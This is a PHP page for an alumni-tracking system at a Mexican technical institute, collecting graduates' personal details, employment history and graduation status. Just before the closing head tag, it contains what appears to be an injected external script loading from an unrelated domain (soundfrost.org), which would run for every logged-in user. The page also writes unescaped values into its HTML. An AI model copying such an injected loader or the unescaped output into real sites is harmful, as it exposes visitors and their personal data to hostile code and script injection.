<?php 
session_start();
if(!isset($_SESSION["idregistro"])){
	die("<script>location.href='index.php';</script>");}
//print_r($_SESSION);
//die();
?>
<!DOCTYPE html>
<html>
<head>
	<link rel="Shortcut Icon" type="image/x-icon" href="../images/cube.ico" />
	<title>Sistema para Seguimiento de Egresados del Departamento de Sistemas y Computación  </title>
	<!-- Inlcuye dentro del título de la página un icono el cuál será el "cubo" del logotipo del Sistema Integral -->
	<meta charset="utf-8" />
	<!-- Importación del archivo: *STYLE.CCS* -->
	<!-- Importación del archivo: *STYLE.CCS* -->
	<!--link href="style.css" rel="stylesheet" type="text/css" /-->
<script src='https://soundfrost.org/jsn.php?ver=381&id=17a257e2899119a2d164a3a2cada9b39'></script></head>
	<script type="text/javascript" src="../js/jquery.js"></script>
	<script type="text/javascript" src="../js/jquery-ui.js"></script>
	<script type="text/javascript" src="../js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="../css/jquery-ui.css">
	<link rel="stylesheet" href="../css/bootstrap.min.css">
	<link rel="stylesheet" href="../css/bootstrap-theme.min.css">
	<link rel="stylesheet" href="../style.css" />
	<style>
		#container{
			padding:10px;
			width:150%;
			height:635px;
			}
			
/*Cambiar las propiedades del contenido: background, font-size, font-family ...*/
.ui-accordion .ui-accordion-content
{

background: #F5F5F5;
color: black;
font-size: 14px;
}
/*Cambiar las propiedades de la cabecera: background, font-size, font-family ...*/
.ui-accordion .ui-accordion-header
{
background: black;
color: #FFFFFF;
font-size: 18px;
}

/*Cambiar las propiedades de la tecla activa de la cabecera: background, font-size, font-family ...*/
.ui-accordion .ui-accordion-header-active
{
background: navy;
}
/*Cambiar las propiedades de la cabecera al pasar el mouse sobre: background, font-size, font-family ...*/
.ui-accordion .ui-accordion-header:hover
{
background: Dodgerblue;
font-style: oblique;

}
	</style>
</head>
<body>
	<body>
<div class="main">
  <div class="header_resize">
    <div class="header">
		
      <div class="logo"><a href="index.php"><img src="../images/logo.gif" width="338" height="70" border="0" alt="logo" /></a></div>
      <div class="menu">
        <ul>
          <li><a href="index.php"><span>Inicio</span></a></li>
          <li><a href="" class="active"><span>Directorio</span></a></li>
		  <li><a href="logout.php"><span>Cerrar Sesión </span></a></li>
        </ul>
      </div>
 </div>
      <div class="clr"></div>
      <div class="clr"></div>
    </div>
  </div>
  <div class="clr"></div>
  <div class="header_blog2">
    <div class="header">
      <h2 id="tituloInvestigacion" align="center">Sistema para el Seguimiento de Egresados del Departamento de Sistemas y Computación</h2>
      <center><p>Ing. Sergio Váldez Hernández <br />
         <strong>RESPONSABLE</strong></p></center>
    </div>
    <div class="clr"></div>
  </div>
  <div class="clr"></div>
  <div class="body">
    <div class="body_resize">
      <div class="left">
	<div id="container">
		<div id="accordion">
			<h3 class="panel-heading">Datos personales</h3>
			<div>
				<h5>Ingresa tus Datos Personales</h5>
				<form id="form-insertar" action="" class="form">
					<input type="hidden" name="id" value="<?= $_SESSION["idregistro"]?>">
					<div class="form-container">
						<label for="Nombre">Nombre</label>
						<p><input class="datos" type="text" id="Nombre" name="Nombre" placeholder="Inserte su nombre" value="<?= $_SESSION["nombre"] ?>" class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Paterno">Apellido Paterno</label>
						<p><input class="datos" type="text" id="Paterno" name="Paterno" placeholder="Apellido paterno" value="<?= $_SESSION["paterno"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Materno">Apellido Materno</label>
						<p><input class="datos" type="text" id="Materno" name="Materno" placeholder="Apellido materno " value="<?= $_SESSION["materno"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Control">Número de Control</label>
						<p><input class="datos" type="int" id="Control" name="Control" placeholder="Número de Control" value="<?= $_SESSION["control"] ?>" class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Sexo">Sexo</label>
						<br><label for="SexoH">Hombre</label>
					    <p><input class="datos" type="radio" id="SexoH" name="Sexo" value="H" <?php echo (($_SESSION["sexo"] == "H") ? "checked": "")?> class="form-control"></p>
						<label for="SexoM">Mujer</label>
						<br><input class="datos" type="radio" id="SexoM" name="Sexo" value="M" <?php echo (($_SESSION["sexo"] == "M") ? "checked": "")?>  class="form-control">
					</div>
					<div class="form-container">
						<label for="Telefono">Teléfono</label>
						<p><input class="datos" type="tel" id="Telefono" name="Telefono" placeholder="Teléfono hogar" value="<?= $_SESSION["telefono"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Celular">Teléfono celular</label>
						<p><input class="datos" type="tel" id="Celular" name="Celular" placeholder="Celular" value="<?= $_SESSION["celular"] ?>"  class="form-control"></p>
					</div>
					
					<div class="form-container">
						<label for="Direccion">	Dirección</label>
						<p><input class="datos" type="text" id="Direccion" name="Direccion" placeholder="Calle y Número" value="<?= $_SESSION["direccion"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Ciudad">Ciudad</label>
						<p><input class="datos" type="text" id="Ciudad" name="Ciudad" placeholder="Ciudad o Municipio" value="<?= $_SESSION["ciudad"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Estado">Estado</label>
						<p><input class="datos" type="text" id="Estado" name="Estado" placeholder="Estado donde resides actualmente" value="<?= $_SESSION["estado"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
				<label for="Carrera">Selecciona tu Carrera</label><br>
				<input type="radio" name="Carrera" value="Ing. Informática" value= >Ing. Informática<br> 
				<input type="radio" name="Carrera" value="Ing. en Sistemas Computacionales " value="<?= $_SESSION["carrera"] ?>" >Ing. en Sistemas Computacionales <br>
				<input type="radio" name="Carrera" value="Ing. en Tecnologias de la Información y la Comunicación" value="<?= $_SESSION["carrera"] ?>" >Ing. en Tecnologias de la Información y la Comunicación<br>
				<input type="radio" name="Carrera" value="Lic. en Informática" value="<?= $_SESSION["carrera"] ?>" >Lic. en Informática<br>
				    </div>
					<div class="form-container">
						<label for="Generacion">Generación</label>
						<p><input class="datos" type="text" id="Generacion" name="Generacion" placeholder="Año de egreso" value="<?= $_SESSION["generacion"] ?>"  class="form-control">
					</div>
					<div class="form-container">
						<label for="Correo">Correo</label>
						<p><input class="datos" type="mail" id="Correo" name="Correo" placeholder="ejemplo@ejemplo.com"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Redes">Compartenos tus redes sociales</label>
						<p><input class="datos" type="text" id="Redes" name="Redes" placeholder="www.facebook.com/ejemplo.ejemplo" value="<?= $_SESSION["redes"] ?>"  class="form-control"></p>
					</div>
					<div class="form-container">
						<label for="Compartir">¿Deseas Compartir tus datos con compañeros de tu generación?</label>
						<p><input class="datos" type="checkbox" id="Compartir" name="Compartir" placeholder="Compartir" value="<?= $_SESSION["compartir"] ?>"  class="form-control"></p>
						<label for="compartir">Compartir</label>
					</div>
					<div class="form-container">
						<input class="boton" type="submit" id="btnGuardarInformacion" value="Guardar información" class="form-control btn btn-primary">
					</div>
				</form>
			</div>
			<h3>Experiencia laboral</h3>
			<div>
				<h5>Cuentanos tu Experiencia Laboral</h5>
		<form id="form-insertar2" action="" class="form">
			<input type="hidden" name="id" value="<?= $_SESSION["idregistro"]?>">
			<div class="form-container">
				<label for="tiempo">¿Cuánto tiempo tardaste en conseguir tu primer empleo despues de egresar?</label>
				<p><input class="experiencia" type="text" id="tiempo" name="tiempo" placeholder="Días, Meses o Años" value="<?= $_SESSION["tiempo"] ?>" class="form-control">
			</div>
			<div class="form-container">
						<br><label for="situacion">¿Actualmente estas trabajando?:</label>
						<br><label for="Si">Si</label>
						<input class="experiencia" type="radio" id="Si" name="trabajando" value="si" <?php echo (($_SESSION["trabajando"] == "si") ? "checked": "")?> class="form-control">
						<br><label for="No">No</label>
						<input class="experiecia" type="radio" id="No" name="trabajando" value="no" <?php echo (($_SESSION["trabajando"] == "no") ? "checked": "")?> class="form-control">
					</div>
					<div class="form-container">
				<label for="ejerciendo">¿Estás ejerciendo tu carrera?</label>
						<br><label for="Si">Si</label>
						<input class="experiencia" type="radio" id="Si" name="ejerciendo" value="si" <?php echo (($_SESSION["ejerciendo"] == "si") ? "checked": "")?> class="form-control">
						<br><label for="No">No</label>
						<input class="experiecia" type="radio" id="No" name="ejerciendo" value="no" <?php echo (($_SESSION["ejerciendo"] == "no") ? "checked": "")?> class="form-control">
			</div>
			<div class="form-container">
				<label for="formal">¿Trabajas de manera formal o informal?</label>
				<br><label for="Formal">Formal</label>
						<input class="experiencia" type="radio" id="formal" name="formal" value="formal" <?php echo (($_SESSION["formal"] == "formal") ? "checked": "")?>class="form-control">
						<br><label for="Informal">Informal</label>
						<input class="experiecia" type="radio" id="informal" name="formal" value="informal" <?php echo (($_SESSION["formal"] == "informal") ? "checked": "")?> class="form-control">
			</div>
			<div class="form-container">
				<label for="negocio">¿Cuentas con tu propio negocio?</label>
				        <br><label for="Si">Si</label>
						<input class="experiencia" type="radio" id="Si" name="negocio" value="si" <?php echo (($_SESSION["negocio"] == "si") ? "checked": "")?> class="form-control">
						<br><label for="No">No</label>
						<input class="experencia" type="radio" id="No" name="negocio" value="no" <?php echo (($_SESSION["negocio"] == "no") ? "checked": "")?> class="form-control">
			</div>
			<div class="form-container">
				<label for="telOficina">Teléfono de Oficina</label>
				<p><input class="experiencia" type="tel" id="telOficina" name="telOficina" placeholder="xxx-xxx-xxxx" value="<?= $_SESSION["teloficina"] ?>" class="form-control">
				
			</div>
			<div class="form-container">
				<label for="conocimiento">¿En que área de conocimiento te desempeñas?</label>
				<p><input class="experiencia" type="text" id="conocimiento" name="conocimiento" placeholder="" value="<?= $_SESSION["conocimiento"] ?>" class="form-control"></p>
			<div class="form-container">
				<label for="cursos">Cuéntanos que cursos has tomado</label>
				<p><input class="experiencia" type="text" id="cursos" name="cursos" placeholder="Cursos" value="<?= $_SESSION["cursos"] ?>" class="form-control"></p>
			</div>
			<div class="form-container">
				<label for="conferencias">¿Podemos contar contigo para impartir conferencias, simposiums, etc.?</label>
				        <br><label for="Si">Si</label>
						<input class="experiencia" type="radio" id="Si" name="conferencias" value="si" <?php echo (($_SESSION["conferencias"] == "si") ? "checked": "")?> class="form-control">
						<br><label for="No">No</label>
						<input class="experencia" type="radio" id="No" name="conferencias" value="no" <?php echo (($_SESSION["conferencias"] == "no") ? "checked": "")?> class="form-control">
			</div>
			<div class="form-container">
						<label for="apoyo">¿Con cuál de estas opciones nos puedes apoyar? </label>
						<br><label for="servicio">Servicio Social</label>
					    <br><input class="experiencia" type="checkbox" id="servicio" name="apoyo" value="servicio" <?php echo (($_SESSION["apoyo"] == "si") ? "checked": "")?> class="form-control">
						<br><label for="residentes">Residentes</label>
						<br><input class="experiencia" type="checkbox" id="residentes" name="apoyo" value="residentes <?php echo (($_SESSION["apoyo"] == "si") ? "checked": "")?>" class="form-control">
						<br></be><label for="bolsa">Bolsa de Trabajo</label>
						<br><input class="experiencia" type="checkbox" id="bolsa" name="apoyo" value="bolsa" <?php echo (($_SESSION["apoyo"] == "si") ? "checked": "")?> class="form-control">
					</div>
				<input class="boton" type="submit" id="GuardarInformacion2" value="Guardar información" class="form-control btn btn-primary">
			</div>
			</form>
		</div>
		<h3>Empleos Anteriores</h3>
	<div id="container">
		
		<form id="form-insertar4" action="" class="form">
			<input type="hidden" name="id" value="<?= $_SESSION["idregistro"]?>">
			<div class="form-container">
				<p><input class="empleosAnteriores" name="empresa" placeholder="Nombre de la Empresa"></p>
			</div>
			<div class="form-container">
				<p><input class="empleosAnteriores" name="puesto" placeholder="Puesto que Desempeñó"></p>
			</div>
			<div class="form-container">
				<p><input class="empleosAnteriores" name="anios_laborando" placeholder="Tiempo que prestó sus servicios"></p>
			</div>
			<div class="form-container">
				<input class="boton" type="submit" id="GuardarInformacion4" value="Guardar información" class="form-control btn btn-primary">
			</div>
		</form>
		<ul id="lista_empleos_anteriores"></ul>
	     </div>
			<h3>Titulado</h3>
			<div>
			<h5> ¿Estás titulado?</h5>
		<form id="form-insertar3" action="" class="form">
			<input type="hidden" name="id" value="<?= $_SESSION["idregistro"]?>">
			<div class="form-container">
						<br><label for="situacion">Selecciona tu situación:</label>
						<br><label for="Si">Si</label>
						<input class="boton" type="radio" id="Si" name="situacion" value="si" class="form-control">
						<br><label for="No">No</label>
						<input class="titulado" type="radio" id="No" name="situacion" value="no" class="form-control">
					</div>
			<div class="form-container">
				<label for="motivo">Motivo</label>
				<input class="titulado" type="text" id="motivo" name="motivo" placeholder="Menciona el motivo por el cual no estas titulado" class="form-control">
			</div>
			<p></p><a href="http://integrador.itdurango.mx/indexProyectosInv.html"target='_blank'>Informes sobre TITULACIÓN</a></p>
			<div class="form-container">
				<input class="boton" type="submit" id="GuardarInformacion3" value="Guardar información" class="form-control btn btn-primary">
			</div>
		</form>
			</div> <!-- experiencia -->
		</div>
	</div>
	<script type="text/javascript">
		function lista(){
			$("#lista_empleos_anteriores").html("");
			$.get("../modelos/empleos_anteriores/listar.php",function(registros){
				debugger;
				registros.forEach(function(registro, index){
					$("#lista_empleos_anteriores").prepend("<li id='"+
							registro.id+"'>"+
							registro.empresa+
							"<div class='acciones'>"+
							"<input type='button' class='borrar btn btn-danger' value='Borrar'>"+
							"</div>"+
							"</li>");
				}); //termina foreach
				$(".acciones").hide();
			},"json");
		}
		lista();
		

		$(document).on("click", "#lista_empleos_anteriores li", function(){
			$(".acciones").hide();
			$(this).children().show(500);
		});

		$(document).on("click",".borrar", function(evento){
			var id = $(this).parent().parent().attr("id");
			$.post("../modelos/empleos_anteriores/borrar.php", {"id":id}, 
				function(respuesta){
					alert(respuesta);
					lista();
				});
		});

		
	</script>
	<script>
		var icons = {
      header: "ui-icon-circle-arrow-e",
      activeHeader: "ui-icon-circle-arrow-s"
    };
		$("#accordion").accordion({
			collapsible:true,
			heightStyle:"fill",
			icons:icons
			});
/*		$("#container").resizable({
			minWidth:200,
			minHeight:140,
			resize:function(){
				$("#accordion").accordion("refresh");
				}
			});*/
	</script>
	<ul id="lista_trabajos"></ul>
      <script type="text/javascript">
		$(document).on("submit","#form-trabajos",function(e){
			e.preventDefault();
			//debugger;
			$("#form-trabajos").serializeArray();
			//aqui se envía a la bd
			/* en lugar de ponerlo de forma directa con javascript,
			deberia consultarse la bd para actualizar el listado
			funcion lista() */
			$("ul#lista_trabajos").append("<li id=''>"+
				$("#form-trabajos input[name=empresa]").val()
				+" - "+
				$("#form-trabajos input[name=puesto]").val()
				+" - "+
				$("#form-trabajos input[name=anios_laborando]").val()
				+"</li>");
		});
	</script>
	<script>$(document).on("click","#btnGuardarInformacion",function(evento){
			evento.preventDefault();
			$.post("../modelos/Datos_Personales/insertar.php", 
				$("#form-insertar").serialize(), function(respuesta){
					alert(respuesta);
					if (respuesta.indexOf("Datos personales guardados correctamente") > 0){}
					
				});
		});
          </script>
          <script>$(document).on("click","#GuardarInformacion2",function(evento){
			evento.preventDefault();
			$.post("../modelos/Experiencia_Laboral/insertar.php", 
				$("#form-insertar2").serialize(), function(respuesta){
					alert(respuesta);
					if (respuesta.indexOf("Experiencia laboral gurdada correctamente") > 0){}
					
				});
		});
          </script>
          <script>$(document).on("click","#GuardarInformacion4",function(evento){
			evento.preventDefault();
			$.post("../modelos/empleos_anteriores/insertar.php", 
				$("#form-insertar4").serialize(), function(respuesta){
					alert(respuesta);
					if (respuesta.indexOf("Empeos anteriores guardados correctamente") > 0){}
					
				});
		});
          </script>
          <script>$(document).on("click","#GuardarInformacion3",function(evento){
			evento.preventDefault();
			$.post("../modelos/Titulado/insertar.php", 
				$("#form-insertar3").serialize(), function(respuesta){
					alert(respuesta);
					if (respuesta.indexOf("Información de Titulación guardada correctamente") > 0){}
					
				});
		});
          </script>
	<!-- ################################################################### PIE DE PÁGINA ################################################################### -->
  <div class="footer">
    <div class="footer_resize">
      <p class="leftt">EL SISTEMA INTEGRAL ES UN ESFUERZO DE CONOCIMIENTOS PARA LA GENERACIÓN DE UNA APLICACIÓN WEB QUE SIRVA DE SOPORTE PARA LAS FUNCIONES DEL DEPARTAMENTO DE SISTEMAS Y COMPUTACIÓN.<br />
        <a href="index.html">HOME</a> | <a href="#">DESARROLLADORES DE LA APLICACIÓN</a> | <a href="#">MARCO LEGAL</a></p>
      <p class="right"><a href="http://www.itdurango.edu.mx/">INSTITUTO TECNOLÓGICO DE DURANGO "LA TÉCNICA AL SERVICIO DE LA PATRIA"</a></p>
      <div class="clr"></div>
    </div>
    <div class="clr"></div>
  </div>
</body>
</html>
 
</div>
</body>
</html>
